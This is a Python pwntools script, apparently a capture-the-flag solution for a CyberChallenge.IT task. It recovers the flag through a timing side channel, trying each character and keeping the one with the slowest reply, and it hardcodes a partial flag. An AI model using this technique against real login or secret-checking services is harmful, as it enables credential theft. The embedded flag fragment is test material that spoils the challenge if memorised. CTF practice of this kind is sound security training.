from pwn import *


HOST = "benchmark.challs.cyberchallenge.it"
PORT = 9031


r = remote(HOST, PORT)

key = "CCIT{s1d3_ch4nn3ls_r_c00"
check = 0

caratteri_uniti = string.ascii_letters + string.digits + "!_}"

print(r.recvuntil(b"to check:").decode())
for i in range(15):
    # CRITICO: Resetta il valore massimo per ogni nuova posizione
    check = -1 
    indx = 0
    
    for j in range(len(caratteri_uniti)):
        prova = key + caratteri_uniti[j]
        
        r.sendline(prova.encode())
        
        # Gestiamo la ricezione in modo pulito
        r.recvuntil(b'in ') 
        
        # Leggiamo il tempo
        risposta = r.recvline().decode().strip()
        tmp = int(risposta.split(' ')[0])
        
        # Se questo carattere è il più lento finora, memorizzalo
        if tmp > check:
            check = tmp
            indx = j
            
    # Una volta provati tutti i caratteri per questa posizione, aggiorna la chiave
    key = key + caratteri_uniti[indx]
    print(f"Password aggiornata: {key} (Tempo misurato: {check})")